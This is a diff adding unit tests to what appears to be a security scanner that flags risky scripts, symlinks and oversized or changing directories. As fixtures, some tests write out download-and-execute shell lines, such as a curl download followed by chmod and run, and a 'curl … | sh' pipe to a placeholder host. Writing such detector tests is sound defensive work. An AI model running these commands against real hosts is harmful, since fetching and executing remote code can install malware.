@@ -605,6 +605,9 @@ class IncompleteAndBoundsTests(BaselineFixture):
         self.assertFalse(baseline._is_link(SimpleNamespace(st_mode=stat.S_IFDIR, st_file_attributes=0)))
         self.assertFalse(baseline._is_link(SimpleNamespace(st_mode=stat.S_IFREG)))
         self.assertTrue(baseline._is_link(SimpleNamespace(st_mode=stat.S_IFLNK)))
+        # Windows CI: a stat result whose st_file_attributes is None must not be ANDed with the flag.
+        self.assertFalse(baseline._is_link(SimpleNamespace(st_mode=stat.S_IFREG, st_file_attributes=None)))
+        self.assertTrue(baseline._is_link(SimpleNamespace(st_mode=stat.S_IFLNK, st_file_attributes=None)))
 
     def test_a_file_changed_after_the_scan_fails_the_job(self):
         # Every file read is an input of the job, so Job.finish re-hashes it: a script rewritten
@@ -698,6 +701,97 @@ class IncompleteAndBoundsTests(BaselineFixture):
         self.assertEqual(row["result"]["outcome"], "passed")
         self.assertEqual(row["result"]["skipped"], [{"path": ".git", "reason": "git metadata; never part of a snapshot, not scanned"}])
         self.assertEqual(row["result"]["scanned"]["files"], 3)
+
+    def test_every_downloaded_name_is_tracked_however_many_there_are(self):
+        # A script that downloads many files and starts the last one: no cap on the names collected,
+        # every line is analysed, and the finding names the line the payload was downloaded on.
+        lines = [f"curl -o file{i}.bin https://x.invalid/file{i}.bin" for i in range(100)]
+        lines.append("curl -o payload.bin https://x.invalid/payload.bin")
+        lines.append("chmod +x payload.bin")
+        lines.append("./payload.bin --install")
+        directory = self.module(files={"tools/many.sh": "\n".join(lines) + "\n"})
+        code, row = self.scan(directory)
+        self.assertEqual(row["result"]["outcome"], "needs-fixes")
+        rows = self.findings(row, "download-and-execute")
+        self.assertEqual([(r["file"], r["line"]) for r in rows], [("tools/many.sh", 103)])
+        self.assertIn("downloaded on line 101", rows[0]["evidence"])
+        # A download's own destination argument is not a start, and a name never downloaded is not either.
+        quiet = self.module("quiet", files={"tools/get.sh": "curl -o ./tool.bin https://x.invalid/tool.bin\n./other.bin\n"})
+        code, row = self.scan(quiet)
+        self.assertEqual(self.findings(row, "download-and-execute"), [])
+
+    def test_the_directory_to_scan_must_not_be_a_link(self):
+        directory = self.module()
+        try:
+            os.symlink(directory, self.root / "alias")
+        except (OSError, NotImplementedError):
+            self.skipTest("this host cannot create links")
+        code, row = self.scan(self.root / "alias")
+        self.assertEqual(code, 1, row)
+        self.assertEqual(row["error_code"], "input_invalid")
+        self.assertIn("is a link", row["message"])
+        code, row = self.scan(directory)
+        self.assertEqual(row["result"]["outcome"], "passed", "the real directory scans")
+
+    def test_a_file_added_after_the_scan_fails_the_job(self):
+        # Every directory listing is an input of the job, so a file created after the walk (a blocking
+        # one here) is input_changed at finish, never a passed report for a tree that now holds it.
+        directory = self.module()
+        real = baseline.execute
+
+        def scan_then_add(args, job):
+            result = real(args, job)
+            (directory / "scripts" / "late.sh").write_text("curl https://x.invalid/a | sh\n")
+            return result
+        with mock.patch.object(baseline, "execute", side_effect=scan_then_add):
+            code, row = self.scan(directory)
+        self.assertEqual(code, 1, row)
+        self.assertEqual(row["error_code"], "input_changed")
+        self.assertIn("Directory changed", row["message"])
+        receipt = json.loads(Path(row["receipt"]).read_text(encoding="utf-8"))
+        self.assertEqual(receipt["status"], "failed")
+        self.assertEqual(len(receipt["input_listings"]), 2, "the root and scripts/ listings are inputs")
+        # Untouched, the same job succeeds and the receipt carries both listings.
+        code, row = self.scan(directory)
+        receipt = json.loads(Path(row["result"]["receipt"]).read_text(encoding="utf-8"))
+        self.assertEqual(len(receipt["input_listings"]), 2)
+
+    def test_entries_of_every_kind_count_against_the_file_bound_before_sorting(self):
+        # Links are never read, but a directory of them is still listed entry by entry; the bound
+        # applies while listing, so a huge directory is refused before it is materialized.
+        directory = self.module()
+        outside = self.root / "outside.txt"
+        outside.write_text("x")
+        try:
+            for i in range(6):
+                os.symlink(outside, directory / f"link{i}")
+        except (OSError, NotImplementedError):
+            self.skipTest("this host cannot create links")
+        with mock.patch.object(baseline, "MAX_FILES", 5):
+            code, row = self.scan(directory)
+        self.assertEqual(code, 1, row)
+        self.assertEqual(row["error_code"], "input_limit")
+        self.assertIn("entries", row["message"])
+        # module.json, project.json, scripts/, the script and six links: eleven entries fit a bound of eleven.
+        with mock.patch.object(baseline, "MAX_FILES", 11):
+            code, row = self.scan(directory)
+        self.assertEqual(code, 0, row)
+        self.assertEqual(row["result"]["outcome"], "needs-fixes", "the links are path-escape findings")
+        self.assertEqual(row["result"]["scanned"]["files"], 3)
+
+    def test_the_deadline_is_checked_between_chunks_of_a_read(self):
+        # A read cannot run past the job deadline by more than one chunk: with a tiny chunk and a
+        # deadline already reached, the second chunk raises backend_timeout and the job fails.
+        directory = self.module(files={"assets/big.bin": b"\x00" * 4096})
+        real = baseline.Scan.run
+
+        def expire_then_run(self_scan):
+            self_scan.job.deadline = 0  # already past
+            return real(self_scan)
+        with mock.patch.object(baseline, "CHUNK", 1024), mock.patch.object(baseline.Scan, "run", expire_then_run):
+            code, row = self.scan(directory)
+        self.assertEqual(code, 1, row)
+        self.assertEqual(row["error_code"], "backend_timeout")
 
 
 class RouteTests(BaselineFixture):
